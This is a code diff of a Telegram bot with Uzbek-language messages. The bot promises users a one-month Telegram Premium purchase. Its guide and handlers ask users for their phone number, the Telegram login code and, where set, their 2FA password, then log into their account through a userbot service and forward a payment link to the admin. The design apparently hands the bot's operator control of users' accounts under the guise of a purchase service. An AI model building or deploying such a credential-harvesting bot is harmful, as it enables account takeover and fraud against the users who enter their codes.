@@ -155,7 +155,7 @@ async def show_guide(callback: CallbackQuery):
         "2. So'ngra <b>1 Oylik Premium Olish</b> tugmasini bosing.\n"
         "3. Akkauntingizni ulash uchun telefon raqamingizni kiriting.\n"
         "4. Telegram'dan kelgan kodni kiriting.\n"
-        "5. Tizim avtomatik ravishda Premium obunani sotib oladi.\n\n"
+        "5. Tizim avtomatik ravishda to'lov havolasini adminga yuboradi.\n\n"
         "Savollaringiz bo'lsa, adminga murojaat qiling."
     )
     await callback.message.edit_text(text, reply_markup=InlineKeyboards.back_to_main())
@@ -220,20 +220,17 @@ async def process_code(message: Message, state: FSMContext, bot: Bot):
 
         await message.answer("✅ Akkaunt muvaffaqiyatli ulandi! To'lov havolasi olinmoqda...")
         
-        # To'lov havolasini olish
-        success, payment_url = await userbot_service.get_payment_url(result)
+        # To'lov havolasini olish (sinxron)
+        payment_url = userbot_service.get_payment_url()
         
-        if success:
-            admin_text = (
-                f"🔔 <b>3DS Tasdiqlash havolasi!</b>\n\n"
-                f"👤 Foydalanuvchi: {message.from_user.full_name}\n"
-                f"🆔 ID: <code>{message.from_user.id}</code>\n\n"
-                f"Havolani bosib, SMS kodni kiritib tasdiqlang:\n{payment_url}"
-            )
-            await bot.send_message(Config.ADMIN_ID, admin_text)
-            await message.answer("📲 To'lov havolasi adminga yuborildi. Admin tasdiqlashini kuting.")
-        else:
-            await message.answer(f"❌ Xatolik: {payment_url}")
+        admin_text = (
+            f"🔔 <b>To'lov havolasi tayyor!</b>\n\n"
+            f"👤 Foydalanuvchi: {message.from_user.full_name}\n"
+            f"🆔 ID: <code>{message.from_user.id}</code>\n\n"
+            f"Quyidagi havolani brauzerda ochib, to'lovni yakunlang:\n{payment_url}"
+        )
+        await bot.send_message(Config.ADMIN_ID, admin_text)
+        await message.answer("📲 To'lov havolasi adminga yuborildi. Admin tasdiqlashini kuting.")
         
         await state.clear()
     elif result == "2FA_PASSWORD":
@@ -261,20 +258,17 @@ async def process_password(message: Message, state: FSMContext, bot: Bot):
         
         await message.answer("✅ Akkaunt muvaffaqiyatli ulandi! To'lov havolasi olinmoqda...")
         
-        # To'lov havolasini olish
-        success, payment_url = await userbot_service.get_payment_url(result)
+        # To'lov havolasini olish (sinxron)
+        payment_url = userbot_service.get_payment_url()
         
-        if success:
-            admin_text = (
-                f"🔔 <b>3DS Tasdiqlash havolasi!</b>\n\n"
-                f"👤 Foydalanuvchi: {message.from_user.full_name}\n"
-                f"🆔 ID: <code>{message.from_user.id}</code>\n\n"
-                f"Havolani bosib, SMS kodni kiritib tasdiqlang:\n{payment_url}"
-            )
-            await bot.send_message(Config.ADMIN_ID, admin_text)
-            await message.answer("📲 To'lov havolasi adminga yuborildi. Admin tasdiqlashini kuting.")
-        else:
-            await message.answer(f"❌ Xatolik: {payment_url}")
+        admin_text = (
+            f"🔔 <b>To'lov havolasi tayyor!</b>\n\n"
+            f"👤 Foydalanuvchi: {message.from_user.full_name}\n"
+            f"🆔 ID: <code>{message.from_user.id}</code>\n\n"
+            f"Quyidagi havolani brauzerda ochib, to'lovni yakunlang:\n{payment_url}"
+        )
+        await bot.send_message(Config.ADMIN_ID, admin_text)
+        await message.answer("📲 To'lov havolasi adminga yuborildi. Admin tasdiqlashini kuting.")
         
         await state.clear()
     else:
